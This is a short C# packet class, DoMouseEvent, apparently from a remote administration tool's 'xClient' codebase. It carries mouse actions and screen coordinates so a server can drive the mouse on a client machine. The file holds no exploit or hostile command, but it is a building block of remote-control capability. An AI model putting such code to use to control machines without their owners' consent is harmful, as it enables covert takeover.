using System;
using xClient.Core.Networking;
using xClient.Enums;

namespace xClient.Core.Packets.ServerPackets;

[Serializable]
public class DoMouseEvent : IPacket
{
	public MouseAction Action { get; set; }

	public bool IsMouseDown { get; set; }

	public int X { get; set; }

	public int Y { get; set; }

	public int MonitorIndex { get; set; }

	public DoMouseEvent()
	{
	}

	public DoMouseEvent(MouseAction action, bool isMouseDown, int x, int y, int monitorIndex)
	{
		Action = action;
		IsMouseDown = isMouseDown;
		X = x;
		Y = y;
		MonitorIndex = monitorIndex;
	}

	public void Execute(Client client)
	{
		client.Send(this);
	}
}
